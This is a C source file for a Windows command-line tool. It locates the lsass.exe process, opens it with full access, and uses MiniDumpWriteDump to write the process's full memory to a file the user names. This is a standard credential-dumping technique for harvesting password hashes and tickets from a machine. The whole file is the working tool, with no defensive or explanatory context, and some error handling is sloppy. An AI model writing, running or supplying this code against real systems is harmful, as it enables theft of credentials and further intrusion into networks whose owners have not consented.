#include <stdio.h>
#include <Windows.h>
#include <minidumpapiset.h>
#include <TlHelp32.h>

#pragma comment(lib, "DbgHelp.lib")



DWORD findLsassPid() {
	DWORD dwLsassPid = 0;
	HANDLE hProcessSnapshot;
	PROCESSENTRY32W pe32;
	LPCWSTR processName = L"";


	hProcessSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (!hProcessSnapshot) {
		printf("[-] couldn't take process snapshot %lu", GetLastError());
		return 1;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32W);

	if (!Process32FirstW(hProcessSnapshot, &pe32)) {
		printf("[-] failed to copy the first entry of the process list to the buffer\n");
		return 1;
	}


	while (_wcsicmp(L"lsass.exe", processName) != 0) {
		Process32NextW(hProcessSnapshot, &pe32);
		processName = pe32.szExeFile;
		dwLsassPid = pe32.th32ProcessID;
	}
	return dwLsassPid;
}





int main(int argc, char** argv) {
	DWORD dwProcessId;
	HANDLE hLsass;
	HANDLE hDumpFile;
	WCHAR DumpFileName[MAX_PATH];

	
	if (argc < 2) {
		printf("[-] Usage: %s <DumpFile>\n", argv[0]);
		return 1;
	}


	dwProcessId = findLsassPid();
	if (dwProcessId == 0) {
		printf("[-] lsass pid couldn't be found\n");
		return 1;
	}

	char* filenameArg = argv[1];
	
	MultiByteToWideChar(CP_ACP, 0, filenameArg, -1, DumpFileName, MAX_PATH);

	if (!DumpFileName || *DumpFileName == '\0') {
		printf("[-] please provide a filename\n");
		return 1;
	}

	hDumpFile = CreateFile(DumpFileName, GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL); 
	


	hLsass = OpenProcess(PROCESS_ALL_ACCESS, TRUE, dwProcessId);
	

	if (!hLsass) {
		printf("[-] could not get the handle to the lsass process\n");
		return 1;
	}
	printf("[+] got a handle to the lsass process\n");



	BOOL wasDumped = MiniDumpWriteDump(hLsass, dwProcessId, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
	
	if (!wasDumped) {
		printf("[-] the dump was not successful error: %lu", GetLastError()); // in this case GetLastError() returs HRESULT, not DWORD win32 error code
	}
	printf("[+] lsass process was succesfully dumped\n");

	return 0;
}
